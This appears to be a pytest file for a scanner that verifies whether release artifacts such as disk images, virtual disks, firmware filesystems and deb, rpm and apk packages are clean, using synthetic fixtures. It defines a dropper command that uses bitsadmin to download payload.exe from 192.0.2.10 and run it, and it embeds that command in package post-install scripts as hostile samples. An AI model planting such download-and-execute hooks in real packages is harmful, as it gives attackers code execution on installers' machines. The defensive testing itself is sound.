"""Coverage wave 1 fixtures: no container with an unenumerated
interior (validation research, event-zero total coverage report,
build wave 1).

Disk images and virtual disks (ISO 9660, raw MBR and GPT images,
FAT and ext interiors, VHD, VHDX, QCOW2, DMG), firmware filesystem
interiors (SquashFS, CRAMFS, JFFS2, UBI) with carved DXE drivers,
and OS package formats (deb, rpm, Alpine apk) must enumerate their
members as verdict units, exactly as zip and tar members are. A
benign interior fully accounted can still reach NO; a hostile
interior (the wave 2 script dropper shape) cannot; an interior
this build cannot enumerate caps the unit at YES UNACCOUNTED with
the interior named.

Every fixture is synthetic and built in this file or with the
system mkfs tools. No sample is downloaded.
"""
import gzip, io, os, plistlib, shutil, struct, subprocess, tarfile, uuid, zlib

import pytest

from event_zero.verdict import verdict, enumerate_subject
import tempfile

BENIGN_TEXT = b"ordinary release notes, nothing executable\n"
DROPPER_CMD = (b"@echo off\r\n"
               b"bitsadmin /transfer job http://192.0.2.10/payload.exe C:\\p.exe\r\n"
               b"start C:\\p.exe\r\n")


def _write(tmp_path, name, data):
    p = os.path.join(str(tmp_path), name)
    with open(p, "wb") as f:
        f.write(data)
    return p


def _entries(path):
    with tempfile.TemporaryDirectory() as td:
        entries, _i, _b, _u, _f, _e, _eb = enumerate_subject(path, td)
    return [e["rel"] for e in entries]


def _assert_not_no(v):
    assert v["verdict"] == "YES", v["headline"]


def _assert_no(v):
    assert v["verdict"] == "NO", v["headline"]
    assert v["reason_class"] == "ACCOUNTED", v["headline"]


def _assert_capped(v, needle):
    _assert_not_no(v)
    assert v["reason_class"] == "UNACCOUNTED", v["headline"]
    joined = "\n".join(v["unaccounted"] + v["blockers"])
    assert needle in joined, joined


# ---------------------------------------------------------------- ISO 9660

def _both16(v): return struct.pack("<H", v) + struct.pack(">H", v)
def _both32(v): return struct.pack("<I", v) + struct.pack(">I", v)


def make_iso(files):
    SECT = 2048
    root_lba = 19
    lbas = {}
    lba = 20
    for name, data in files.items():
        lbas[name] = lba
        lba += max(1, (len(data) + SECT - 1) // SECT)
    total = lba

    def rec(extent, size, flags, name):
        ln = 33 + len(name) + (0 if len(name) % 2 else 1)
        r = struct.pack("B", ln) + b"\x00" + _both32(extent) + _both32(size)
        r += b"\x7c\x01\x01\x00\x00\x00\x00" + bytes([flags]) + b"\x00\x00"
        r += _both16(1) + bytes([len(name)]) + name
        if len(name) % 2 == 0:
            r += b"\x00"
        return r

    root = rec(root_lba, SECT, 2, b"\x00") + rec(root_lba, SECT, 2, b"\x01")
    for name, data in files.items():
        root += rec(lbas[name], len(data), 0, name.encode())
    root += b"\x00" * (SECT - len(root))
    pvd = bytearray(SECT)
    pvd[0] = 1
    pvd[1:6] = b"CD001"
    pvd[6] = 1
    pvd[80:88] = _both32(total)
    pvd[120:124] = _both16(1)
    pvd[124:128] = _both16(1)
    pvd[128:132] = _both16(SECT)
    pvd[132:140] = _both32(10)
    struct.pack_into("<I", pvd, 140, 18)
    root_rec = rec(root_lba, SECT, 2, b"\x00")
    pvd[156:156 + len(root_rec)] = root_rec
    term = bytearray(SECT)
    term[0] = 255
    term[1:6] = b"CD001"
    term[6] = 1
    out = bytearray()
    out += b"\x00" * (16 * SECT)
    out += bytes(pvd)          # sector 17 in file terms: index 16
    out += bytes(term)         # index 17
    out += b"\x00" * SECT      # index 18: path table placeholder
    out += root                # index 19 = root_lba
    for name, data in files.items():
        out += data + b"\x00" * ((SECT - len(data) % SECT) % SECT)
    return bytes(out)


def test_iso_benign_interior_reaches_no(tmp_path):
    p = _write(tmp_path, "benign.iso", make_iso({"README.TXT": BENIGN_TEXT}))
    assert any(r.endswith("README.TXT") for r in _entries(p))
    _assert_no(verdict(p))


def test_iso_hostile_interior_is_not_no(tmp_path):
    p = _write(tmp_path, "evil.iso", make_iso({"DROP.CMD": DROPPER_CMD}))
    v = verdict(p)
    _assert_not_no(v)
    assert any("DROP.CMD" in f["path_in_release"] and f["verdict"].startswith("YES")
               for f in v["files"]), v["files"]


def test_iso_truncated_is_capped(tmp_path):
    data = make_iso({"README.TXT": BENIGN_TEXT})
    p = _write(tmp_path, "cut.iso", data[:30000])
    _assert_capped(verdict(p), "cut.iso")


# ---------------------------------------------------------------- FAT and raw disk images

def make_fat(files, total_sectors=2048):
    bps = 512
    spc = 1
    reserved = 1
    nfats = 1
    root_entries = 16
    fatsz = 6
    fat_off = reserved * bps
    root_off = fat_off + nfats * fatsz * bps
    data_off = root_off + root_entries * 32
    img = bytearray(total_sectors * bps)
    img[0:3] = b"\xeb\x3c\x90"
    img[3:11] = b"EZFAT   "
    struct.pack_into("<H", img, 11, bps)
    img[13] = spc
    struct.pack_into("<H", img, 14, reserved)
    img[16] = nfats
    struct.pack_into("<H", img, 17, root_entries)
    struct.pack_into("<H", img, 19, total_sectors if total_sectors < 65536 else 0)
    img[21] = 0xF8
    struct.pack_into("<H", img, 22, fatsz)
    img[54:62] = b"FAT12   "
    img[510:512] = b"\x55\xaa"
    clusters = {}
    nxt = 2
    fat = bytearray(fatsz * bps)
    fat[0:3] = b"\xf8\xff\xff"
    for name, data in files.items():
        nclusters = max(1, (len(data) + bps - 1) // bps)
        clusters[name] = (nxt, nclusters)
        for k in range(nclusters):
            c = nxt + k
            val = 0xFFF if k == nclusters - 1 else c + 1
            o = c + c // 2
            cur = struct.unpack_from("<H", fat, o)[0]
            if c & 1:
                cur = (cur & 0x000F) | (val << 4)
            else:
                cur = (cur & 0xF000) | val
            struct.pack_into("<H", fat, o, cur)
        start = data_off + (nxt - 2) * bps
        img[start:start + len(data)] = data
        nxt += nclusters
    img[fat_off:fat_off + len(fat)] = fat
    for i, (name, data) in enumerate(files.items()):
        first, _n = clusters[name]
        stem, _, ext = name.partition(".")
        ent = bytearray(32)
        ent[0:8] = stem.encode().ljust(8, b" ")[:8]
        ent[8:11] = ext.encode().ljust(3, b" ")[:3]
        ent[11] = 0x20
        struct.pack_into("<H", ent, 26, first)
        struct.pack_into("<I", ent, 28, len(data))
        img[root_off + i * 32:root_off + i * 32 + 32] = ent
    return bytes(img)


def make_mbr_disk(partition, ptype=0x0B):
    img = bytearray(512 + len(partition))
    img[510:512] = b"\x55\xaa"
    ent = bytearray(16)
    ent[4] = ptype
    struct.pack_into("<I", ent, 8, 1)
    struct.pack_into("<I", ent, 12, len(partition) // 512)
    img[446:462] = ent
    img[512:512 + len(partition)] = partition
    return bytes(img)


def test_fat_bare_image_benign_reaches_no(tmp_path):
    p = _write(tmp_path, "disk.img", make_fat({"README.TXT": BENIGN_TEXT}))
    assert any(r.endswith("README.TXT") for r in _entries(p))
    _assert_no(verdict(p))


def test_fat_mbr_disk_hostile_is_not_no(tmp_path):
    fat = make_fat({"DROP.CMD": DROPPER_CMD})
    p = _write(tmp_path, "disk.img", make_mbr_disk(fat))
    v = verdict(p)
    _assert_not_no(v)
    assert any("DROP.CMD" in f["path_in_release"] for f in v["files"]), v["files"]


def test_ntfs_partition_is_capped_by_name(tmp_path):
    part = bytearray(8192)
    part[3:11] = b"NTFS    "
    struct.pack_into("<H", part, 11, 512)
    p = _write(tmp_path, "ntfs.img", make_mbr_disk(bytes(part), ptype=0x07))
    _assert_capped(verdict(p), "NTFS")


# ---------------------------------------------------------------- ext2 via mke2fs

@pytest.mark.skipif(not shutil.which("mke2fs"), reason="mke2fs not available")
def test_ext2_benign_and_hostile(tmp_path):
    for label, files, expect_no in (("good", {"hello.txt": BENIGN_TEXT}, True),
                                    ("bad", {"drop.cmd": DROPPER_CMD}, False)):
        root = tmp_path / f"root_{label}"
        root.mkdir()
        for name, data in files.items():
            (root / name).write_bytes(data)
        img = str(tmp_path / f"{label}.img")
        r = subprocess.run(["mke2fs", "-q", "-t", "ext2", "-F", "-b", "1024",
                            "-d", str(root), img, "8192"],
                           capture_output=True, text=True)
        assert r.returncode == 0, r.stderr
        v = verdict(img)
        if expect_no:
            _assert_no(v)
        else:
            _assert_not_no(v)


# ---------------------------------------------------------------- virtual disks

def _vhd_footer(disk_size, disk_type):
    f = bytearray(512)
    f[0:8] = b"conectix"
    struct.pack_into(">I", f, 8, 2)
    struct.pack_into(">Q", f, 16, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into(">I", f, 24, 0x61746558)
    struct.pack_into(">I", f, 28, 0x00010003)
    struct.pack_into(">Q", f, 40, disk_size)
    struct.pack_into(">Q", f, 48, disk_size)
    f[56:60] = b"wi2k"
    struct.pack_into(">I", f, 60, disk_type)
    return bytes(f)


def test_vhd_fixed_benign_reaches_no(tmp_path):
    fat = make_fat({"README.TXT": BENIGN_TEXT})
    p = _write(tmp_path, "fixed.vhd", fat + _vhd_footer(len(fat), 2))
    _assert_no(verdict(p))


def test_vhd_dynamic_benign_reaches_no(tmp_path):
    fat = make_fat({"README.TXT": BENIGN_TEXT})
    block_size = len(fat)
    footer = _vhd_footer(block_size, 3)
    dyn = bytearray(1024)
    dyn[0:8] = b"cxsparse"
    struct.pack_into(">Q", dyn, 8, 0xFFFFFFFFFFFFFFFF)
    bat_off = 512 + 1024
    struct.pack_into(">Q", dyn, 16, bat_off)
    struct.pack_into(">I", dyn, 24, 0x00010003)
    struct.pack_into(">I", dyn, 28, 1)            # max table entries
    struct.pack_into(">I", dyn, 32, block_size)   # block size
    bitmap = ((block_size // 512) // 8 + 511) // 512 * 512
    block_off = bat_off + 512
    bat = bytearray(512)
    struct.pack_into(">I", bat, 0, block_off // 512)
    data = footer + bytes(dyn) + bytes(bat)
    data += b"\x00" * (block_off - len(data))
    data += b"\xff" * bitmap + fat + footer
    p = _write(tmp_path, "dyn.vhd", data)
    _assert_no(verdict(p))


def test_vhd_differencing_is_capped(tmp_path):
    fat = make_fat({"README.TXT": BENIGN_TEXT})
    p = _write(tmp_path, "diff.vhd", fat + _vhd_footer(len(fat), 4))
    _assert_capped(verdict(p), "differencing")


def test_vhdx_benign_reaches_no(tmp_path):
    fat = make_fat({"README.TXT": BENIGN_TEXT})
    block_size = 1024 * 1024
    disk = fat + b"\x00" * (block_size - len(fat))
    bat_off = 1024 * 1024
    meta_off = 2 * 1024 * 1024
    block_file_off = 3 * 1024 * 1024
    out = bytearray(block_file_off + block_size)
    out[0:8] = b"vhdxfile"
    # region table at 192 KiB
    rt = 192 * 1024
    out[rt:rt + 4] = b"regi"
    struct.pack_into("<I", out, rt + 4, 2)
    bat_guid = uuid.UUID("2dc27766-f623-4200-9d64-115e9bfd4a08").bytes_le
    meta_guid = uuid.UUID("8b7ca206-4790-4b9a-b8fe-575f050f886e").bytes_le
    out[rt + 16:rt + 32] = bat_guid
    struct.pack_into("<Q", out, rt + 32, bat_off)
    struct.pack_into("<I", out, rt + 40, 4096)
    out[rt + 48:rt + 64] = meta_guid
    struct.pack_into("<Q", out, rt + 64, meta_off)
    struct.pack_into("<I", out, rt + 72, 4096)
    # BAT: one payload block, state 6 (fully present)
    struct.pack_into("<Q", out, bat_off, (3 << 20) | 6)
    # metadata region
    out[meta_off:meta_off + 8] = b"metadata"
    struct.pack_into("<H", out, meta_off + 10, 3)
    vsize_guid = uuid.UUID("2fa54224-cd1b-4876-b211-6d9bed83bf4d").bytes_le
    items = [(vsize_guid, struct.pack("<Q", block_size)),
             (uuid.UUID(int=0x1111).bytes_le, struct.pack("<I", block_size)),
             (uuid.UUID(int=0x2222).bytes_le, struct.pack("<I", 512))]
    voff = 32 + len(items) * 32
    for i, (guid, val) in enumerate(items):
        e = meta_off + 32 + i * 32
        out[e:e + 16] = guid
        struct.pack_into("<I", out, e + 16, voff)
        struct.pack_into("<I", out, e + 20, len(val))
        out[meta_off + voff:meta_off + voff + len(val)] = val
        voff += len(val)
    out[block_file_off:block_file_off + block_size] = disk
    p = _write(tmp_path, "disk.vhdx", bytes(out))
    _assert_no(verdict(p))


def test_qcow2_benign_reaches_no(tmp_path):
    fat = make_fat({"README.TXT": BENIGN_TEXT})
    cluster = 65536
    size = cluster * 4
    disk = fat + b"\x00" * (size - len(fat))
    hdr = bytearray(cluster)
    hdr[0:4] = b"QFI\xfb"
    struct.pack_into(">I", hdr, 4, 3)
    struct.pack_into(">I", hdr, 20, 16)       # cluster bits
    struct.pack_into(">Q", hdr, 24, size)
    struct.pack_into(">I", hdr, 36, 1)        # l1 size
    struct.pack_into(">Q", hdr, 40, cluster)  # l1 offset
    l1 = bytearray(cluster)
    struct.pack_into(">Q", l1, 0, (1 << 63) | (2 * cluster))
    l2 = bytearray(cluster)
    for i in range(4):
        struct.pack_into(">Q", l2, i * 8, (1 << 63) | ((3 + i) * cluster))
    out = bytes(hdr) + bytes(l1) + bytes(l2)
    for i in range(4):
        out += disk[i * cluster:(i + 1) * cluster]
    p = _write(tmp_path, "disk.qcow2", out)
    _assert_no(verdict(p))


def test_qcow2_backing_file_is_capped(tmp_path):
    hdr = bytearray(65536)
    hdr[0:4] = b"QFI\xfb"
    struct.pack_into(">I", hdr, 4, 3)
    struct.pack_into(">Q", hdr, 8, 65536)
    struct.pack_into(">I", hdr, 16, 9)
    struct.pack_into(">I", hdr, 20, 16)
    struct.pack_into(">Q", hdr, 24, 65536)
    p = _write(tmp_path, "backed.qcow2", bytes(hdr) + b"base.qcow2")
    _assert_capped(verdict(p), "backing file")


def test_dmg_benign_reaches_no(tmp_path):
    fat = make_fat({"README.TXT": BENIGN_TEXT})
    comp = zlib.compress(fat)
    blob = bytearray(204 + 40)
    blob[0:4] = b"mish"
    struct.pack_into(">I", blob, 200, 1)
    struct.pack_into(">IIQQQQ", blob, 204, 0x80000005, 0, 0, len(fat) // 512, 0, len(comp))
    plist = plistlib.dumps({"resource-fork": {"blkx": [
        {"Attributes": "0x0050", "CFName": "whole disk", "Data": bytes(blob), "ID": "0"}]}})
    trailer = bytearray(512)
    trailer[0:4] = b"koly"
    struct.pack_into(">I", trailer, 4, 4)
    struct.pack_into(">I", trailer, 8, 512)
    data_fork = comp
    xml_off = len(data_fork)
    struct.pack_into(">Q", trailer, 216, xml_off)
    struct.pack_into(">Q", trailer, 224, len(plist))
    p = _write(tmp_path, "disk.dmg", data_fork + plist + bytes(trailer))
    _assert_no(verdict(p))


# ---------------------------------------------------------------- SquashFS

def _meta_block(payload):
    comp = zlib.compress(payload)
    return struct.pack("<H", len(comp)) + comp


def make_squashfs(files):
    """Minimal SquashFS 4.0: zlib metadata, every file stored as a
    fragment tail, no ids, no xattrs."""
    block_size = 4096
    frag_data = bytearray()
    file_meta = []
    for name, data in files.items():
        file_meta.append((name, data, len(frag_data)))
        frag_data += data
    # inode table: root directory inode first, then file inodes.
    # Each inode reference is (block offset << 16) | inner offset;
    # everything sits in one metadata block, so block offset is 0.
    dir_data_len = 12 + sum(8 + len(n) for n, _d, _o in file_meta)
    inode_stream = bytearray()
    root_inode_off = 0
    # basic directory inode (type 1): type, mode, uid, gid, mtime,
    # inode_number, start_block, file_size, offset, parent_inode
    inode_stream += struct.pack("<HHHHiIIIHI", 1, 0o40755, 0, 0, 0, 1, 0,
                                dir_data_len + 3, 0, 1)
    file_refs = []
    for i, (name, data, foff) in enumerate(file_meta):
        file_refs.append(len(inode_stream))
        # basic file inode (type 2): start_block, fragment, offset,
        # file_size, then the (empty) block list
        inode_stream += struct.pack("<HHHHiIQIII", 2, 0o100644, 0, 0, 0,
                                    2 + i, 0, 0, foff, len(data))
    dir_stream = bytearray()
    dir_stream += struct.pack("<III", len(file_meta) - 1, 0, 2)
    for (name, data, foff), ref in zip(file_meta, file_refs):
        dir_stream += struct.pack("<HhHH", ref, 0, 2, len(name) - 1)
        dir_stream += name.encode()
    inode_table = _meta_block(bytes(inode_stream))
    dir_table = _meta_block(bytes(dir_stream))
    frag_block = zlib.compress(bytes(frag_data))
    frag_table = _meta_block(struct.pack("<QII", 0, len(frag_block), 0))
    sb = bytearray(96)
    struct.pack_into("<I", sb, 0, 0x73717368)
    struct.pack_into("<I", sb, 4, 1 + len(file_meta))
    struct.pack_into("<I", sb, 12, block_size)
    struct.pack_into("<I", sb, 16, 1)          # one fragment
    struct.pack_into("<H", sb, 20, 1)          # zlib
    struct.pack_into("<H", sb, 22, 12)         # block log
    struct.pack_into("<H", sb, 28, 4)          # version major
    struct.pack_into("<H", sb, 30, 0)
    out = bytearray(sb)
    inode_start = len(out)
    out += inode_table
    dir_start = len(out)
    out += dir_table
    frag_start = len(out)
    frag_block_off = frag_start + 8 + len(frag_table)
    # rebuild the fragment table now the block offset is known
    frag_table = _meta_block(struct.pack("<QII", frag_block_off, len(frag_block), 0))
    out += struct.pack("<Q", frag_start)  # placeholder replaced below
    out = out[:frag_start]
    out += struct.pack("<Q", frag_start + 8)
    out += frag_table
    assert len(out) == frag_block_off, (len(out), frag_block_off)
    out += frag_block
    bytes_used = len(out)
    id_start = bytes_used
    struct.pack_into("<Q", sb, 32, root_inode_off)
    struct.pack_into("<Q", sb, 40, bytes_used)
    struct.pack_into("<Q", sb, 48, id_start)
    struct.pack_into("<Q", sb, 56, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into("<Q", sb, 64, inode_start)
    struct.pack_into("<Q", sb, 72, dir_start)
    struct.pack_into("<Q", sb, 80, frag_start)
    struct.pack_into("<Q", sb, 88, 0xFFFFFFFFFFFFFFFF)
    out[0:96] = sb
    return bytes(out)


def test_squashfs_benign_reaches_no(tmp_path):
    p = _write(tmp_path, "rootfs.squashfs", make_squashfs({"hello.txt": BENIGN_TEXT}))
    assert any(r.endswith("hello.txt") for r in _entries(p))
    _assert_no(verdict(p))


def test_squashfs_hostile_is_not_no(tmp_path):
    p = _write(tmp_path, "rootfs.squashfs", make_squashfs({"drop.cmd": DROPPER_CMD}))
    v = verdict(p)
    _assert_not_no(v)
    assert any("drop.cmd" in f["path_in_release"] for f in v["files"]), v["files"]


# ---------------------------------------------------------------- CRAMFS via mkfs.cramfs

@pytest.mark.skipif(not shutil.which("mkfs.cramfs"), reason="mkfs.cramfs not available")
def test_cramfs_benign_and_hostile(tmp_path):
    for label, files, expect_no in (("good", {"hello.txt": BENIGN_TEXT}, True),
                                    ("bad", {"drop.cmd": DROPPER_CMD}, False)):
        root = tmp_path / f"cram_{label}"
        root.mkdir()
        for name, data in files.items():
            (root / name).write_bytes(data)
        img = str(tmp_path / f"{label}.cramfs")
        r = subprocess.run(["mkfs.cramfs", str(root), img], capture_output=True, text=True)
        assert r.returncode == 0, r.stderr
        v = verdict(img)
        if expect_no:
            _assert_no(v)
        else:
            _assert_not_no(v)


# ---------------------------------------------------------------- JFFS2

def _jffs2_node(ntype, body):
    totlen = 12 + len(body)
    node = struct.pack("<HHI", 0x1985, ntype, totlen) + b"\x00" * 4 + body
    node += b"\xff" * ((4 - totlen % 4) % 4)
    return node


def make_jffs2(files):
    out = bytearray()
    ino = 2
    for name, data in files.items():
        nb = name.encode()
        dirent = struct.pack("<IIII", 1, 1, ino, 0)
        dirent += bytes([len(nb), 8]) + b"\x00\x00" + b"\x00" * 8
        out += _jffs2_node(0xE001, dirent + nb)
        inode = struct.pack("<IIIHHI", ino, 1, 0o100644, 0, 0, len(data))
        inode += struct.pack("<III", 0, 0, 0)
        inode += struct.pack("<III", 0, len(data), len(data))
        inode += bytes([0, 0]) + b"\x00\x00" + b"\x00" * 8
        out += _jffs2_node(0xE002, inode + data)
        ino += 1
    return bytes(out)


def test_jffs2_benign_reaches_no(tmp_path):
    p = _write(tmp_path, "flash.bin", make_jffs2({"hello.txt": BENIGN_TEXT}))
    # a bare JFFS2 image is detected by its first node header; give
    # it a container suffix-free name and check enumeration happened
    rels = _entries(p)
    assert any(r.endswith("hello.txt") for r in rels), rels
    _assert_no(verdict(p))


def test_jffs2_hostile_is_not_no(tmp_path):
    p = _write(tmp_path, "flash2.bin", make_jffs2({"drop.cmd": DROPPER_CMD}))
    _assert_not_no(verdict(p))


def test_ubi_is_capped_by_name(tmp_path):
    p = _write(tmp_path, "ubi.bin", b"UBI#" + b"\x00" * 4096)
    _assert_capped(verdict(p), "UBIFS")


# ---------------------------------------------------------------- firmware: FV + SquashFS + carved DXE

def _minimal_pe(strings_blob):
    peoff = 0x80
    out = bytearray(peoff + 4 + 20 + 40 + len(strings_blob))
    out[0:2] = b"MZ"
    struct.pack_into("<I", out, 0x3C, peoff)
    out[peoff:peoff + 4] = b"PE\x00\x00"
    coff = peoff + 4
    struct.pack_into("<H", out, coff + 2, 1)   # one section
    struct.pack_into("<H", out, coff + 16, 0)  # no optional header
    sec = coff + 20
    out[sec:sec + 8] = b".text\x00\x00\x00"
    struct.pack_into("<I", out, sec + 16, len(strings_blob))
    struct.pack_into("<I", out, sec + 20, sec + 40)
    out[sec + 40:sec + 40 + len(strings_blob)] = strings_blob
    return bytes(out)


def test_firmware_squashfs_and_dxe_enumerated(tmp_path):
    fv = bytearray(4096)
    fv[40:44] = b"_FVH"
    pe = _minimal_pe(b"SmmAccessDxe\x00TcpDxe\x00Network\x00")
    fv[1024:1024 + len(pe)] = pe
    blob = bytes(fv) + make_squashfs({"hello.txt": BENIGN_TEXT})
    p = _write(tmp_path, "fw.bin", blob)
    rels = _entries(p)
    assert any("hello.txt" in r for r in rels), rels
    assert any("dxe_" in r and r.endswith(".efi") for r in rels), rels
    v = verdict(p)
    _assert_not_no(v)  # the unsigned carved driver is unaccounted
    assert any("dxe_" in f["path_in_release"] for f in v["files"]), v["files"]


def test_firmware_ubi_region_is_capped_by_name(tmp_path):
    fv = bytearray(4096)
    fv[40:44] = b"_FVH"
    blob = bytes(fv) + b"UBI#" + b"\x00" * 8192
    p = _write(tmp_path, "fw_ubi.bin", blob)
    _assert_capped(verdict(p), "UBIFS")


# ---------------------------------------------------------------- OS packages

def _tar_bytes(members, mode="w:gz"):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode=mode) as tf:
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _ar_member(name, body):
    hdr = name.ljust(16) + "0".ljust(12) + "0".ljust(6) + "0".ljust(6)
    hdr += "100644".ljust(8) + str(len(body)).ljust(10) + "`\n"
    out = hdr.encode() + body
    if len(body) % 2:
        out += b"\n"
    return out


def make_deb(data_members, control_members):
    out = b"!<arch>\n"
    out += _ar_member("debian-binary", b"2.0\n")
    out += _ar_member("control.tar.gz", _tar_bytes(control_members))
    out += _ar_member("data.tar.gz", _tar_bytes(data_members))
    return out


def test_deb_benign_reaches_no(tmp_path):
    deb = make_deb({"usr/share/probe/hello.txt": BENIGN_TEXT},
                   {"control": b"Package: probe\nVersion: 1.0\nArchitecture: all\nMaintainer: P <p@example.invalid>\nDescription: probe\n"})
    p = _write(tmp_path, "probe.deb", deb)
    assert any(r.endswith("usr/share/probe/hello.txt") for r in _entries(p))
    _assert_no(verdict(p))


def test_deb_postinst_dropper_is_not_no(tmp_path):
    deb = make_deb({"usr/share/probe/hello.txt": BENIGN_TEXT},
                   {"control": b"Package: probe\nVersion: 1.0\nArchitecture: all\nMaintainer: P <p@example.invalid>\nDescription: probe\n",
                    "postinst": b"#!/bin/sh\nbitsadmin /transfer job http://192.0.2.10/payload.exe C:\\p.exe\nC:\\p.exe\n"})
    p = _write(tmp_path, "evil.deb", deb)
    rels = _entries(p)
    assert any(r.endswith("DEBIAN/postinst") for r in rels), rels
    _assert_not_no(verdict(p))


def _cpio_entry(name, data, mode=0o100644):
    nb = name.encode() + b"\x00"
    fields = [1, mode, 0, 0, 1, 0, len(data), 0, 0, 0, 0, len(nb), 0]
    hdr = "070701" + "".join(f"{v:08x}" for v in fields)
    out = hdr.encode() + nb
    out += b"\x00" * ((4 - len(out) % 4) % 4)
    out += data
    out += b"\x00" * ((4 - len(data) % 4) % 4)
    return out


def _rpm_header(entries):
    store = bytearray()
    ents = []
    for tag, typ, val in entries:
        off = len(store)
        if typ == 6:
            store += val.encode() + b"\x00"
            ents.append((tag, typ, off, 1))
    out = bytearray(b"\x8e\xad\xe8\x01\x00\x00\x00\x00")
    out += struct.pack(">II", len(ents), len(store))
    for tag, typ, off, cnt in ents:
        out += struct.pack(">IIII", tag, typ, off, cnt)
    out += store
    return bytes(out)


def make_rpm(payload_members, scriptlets=None):
    lead = bytearray(96)
    lead[0:4] = b"\xed\xab\xee\xdb"
    lead[4] = 3
    lead[5] = 0
    struct.pack_into(">H", lead, 6, 0)
    lead[10:20] = b"probe\x00".ljust(10, b"\x00")[:10]
    sig = _rpm_header([])
    main_entries = [(1000, 6, "probe"), (1125, 6, "gzip")]
    for tag, text in (scriptlets or {}).items():
        main_entries.append((tag, 6, text))
    main = _rpm_header(main_entries)
    cpio = b"".join(_cpio_entry(n, d) for n, d in payload_members.items())
    cpio += _cpio_entry("TRAILER!!!", b"", mode=0)
    payload = gzip.compress(cpio)
    out = bytes(lead) + sig
    out += b"\x00" * ((8 - len(out) % 8) % 8)
    out += main + payload
    return out


def test_rpm_benign_reaches_no(tmp_path):
    rpm = make_rpm({"usr/share/probe/hello.txt": BENIGN_TEXT})
    p = _write(tmp_path, "probe.rpm", rpm)
    assert any(r.endswith("usr/share/probe/hello.txt") for r in _entries(p))
    _assert_no(verdict(p))


def test_rpm_postin_dropper_is_not_no(tmp_path):
    rpm = make_rpm({"usr/share/probe/hello.txt": BENIGN_TEXT},
                   scriptlets={1024: "#!/bin/sh\nbitsadmin /transfer job http://192.0.2.10/payload.exe C:\\p.exe\nC:\\p.exe\n"})
    p = _write(tmp_path, "evil.rpm", rpm)
    rels = _entries(p)
    assert any("RPMSCRIPT/POSTIN" in r for r in rels), rels
    _assert_not_no(verdict(p))


def make_apk(data_members, control_members):
    sig = gzip.compress(_tar_bytes({"sig.txt": b"synthetic signature placeholder\n"}, "w:"))
    ctl = gzip.compress(_tar_bytes(control_members, "w:"))
    dat = gzip.compress(_tar_bytes(data_members, "w:"))
    return sig + ctl + dat


def test_apk_benign_reaches_no(tmp_path):
    apk = make_apk({"usr/share/probe/hello.txt": BENIGN_TEXT},
                   {".PKGINFO": b"pkgname = probe\npkgver = 1.0\n"})
    p = _write(tmp_path, "probe.apk", apk)
    assert any(r.endswith("usr/share/probe/hello.txt") for r in _entries(p))
    _assert_no(verdict(p))


def test_apk_post_install_dropper_is_not_no(tmp_path):
    apk = make_apk({"usr/share/probe/hello.txt": BENIGN_TEXT},
                   {".PKGINFO": b"pkgname = probe\npkgver = 1.0\n",
                    ".post-install": b"#!/bin/sh\nbitsadmin /transfer job http://192.0.2.10/payload.exe C:\\p.exe\nC:\\p.exe\n"})
    p = _write(tmp_path, "evil.apk", apk)
    rels = _entries(p)
    assert any(r.endswith(".post-install") for r in rels), rels
    _assert_not_no(verdict(p))
